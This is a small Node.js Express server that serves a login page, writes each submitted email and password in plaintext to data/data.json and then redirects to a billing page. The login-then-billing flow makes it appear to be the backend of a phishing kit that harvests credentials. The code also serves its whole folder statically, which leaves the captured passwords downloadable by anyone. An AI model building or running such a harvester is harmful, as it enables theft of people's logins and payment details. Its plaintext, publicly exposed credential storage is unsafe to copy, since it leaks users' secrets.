const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const exp = require('constants');

const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(express.static('.'));

app.post('/login', (req, res) => {
  console.log("hello")
  const data = {
    email: req.body.email,
    password: req.body.password,
    rememberMe: req.body.rememberMe ? 'Yes' : 'No',
  };
  const json = JSON.stringify(data, null, 2);
  fs.writeFileSync('data/data.json', json);

  res.redirect('/billing.html');
});

// app.post('/billing', (req, res) => {
//   console.log("hello")
//   const data = {
//     email: req.body.email,
//     password: req.body.password,
//     rememberMe: req.body.rememberMe ? 'Yes' : 'No',
//   };
//   const json = JSON.stringify(data, null, 2);
//   fs.writeFileSync('data/data.json', json);

//   res.redirect('/billing.html');
// });
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/login.html');
});


app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
